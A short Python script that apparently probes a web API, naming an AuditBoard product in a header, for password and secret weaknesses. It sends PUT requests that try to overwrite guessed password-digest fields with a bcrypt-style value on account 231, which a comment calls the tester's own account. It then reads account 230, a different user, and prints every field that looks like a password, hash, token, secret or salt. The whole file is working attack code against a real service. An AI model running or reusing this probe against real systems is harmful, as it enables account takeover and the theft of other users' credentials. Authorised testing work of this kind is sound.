import json,subprocess,os,hashlib
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
def req(method,path,body=None):
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+T,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
# try common digest field names on my OWN account first (safe baseline)
for field in ['password_digest','encrypted_password','password_hash','password_ciphertext']:
    c,b=req('PUT','/api/v1/users/231',{"user":{field:"$2a$12$abcdefghijklmnopqrstuv"}})
    print(f"  {field:22} on self -> {c} {b[:130].replace(chr(10),' ')}")
print()
# does the API expose a digest on read?
c,b=req('GET','/api/v1/users/230')
u=json.loads(b)['users'][0]
susp=[k for k in u if any(x in k.lower() for x in ['pass','digest','hash','secret','token','salt'])]
print("password-ish fields exposed on read:",susp)
for k in susp: print(f"   {k} = {str(u[k])[:80]}")
